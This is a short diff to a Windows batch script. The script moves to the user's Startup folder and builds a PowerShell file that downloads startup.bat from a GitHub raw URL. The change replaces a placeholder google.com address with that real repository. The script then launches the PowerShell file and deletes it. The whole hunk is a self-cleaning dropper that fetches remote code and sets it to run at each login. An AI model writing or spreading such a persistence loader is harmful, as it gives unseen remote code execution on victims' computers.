@@ -8,7 +8,7 @@ del spike.ps1
 cd "%LocalAppData%/../Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 del "spike.ps1"
 ECHO/$client = new-object System.Net.WebClient >> spike.ps1
-ECHO/$client.DownloadFile("https://google.com/index.html","startup.bat") >> spike.ps1
+ECHO/$client.DownloadFile("https://raw.githubusercontent.com/sys-de-chaos/serviceman/main/startup.bat","startup.bat") >> spike.ps1
 ECHO/del spike.ps1 >> spike.ps1
 start powershell.exe "./spike.ps1"
 
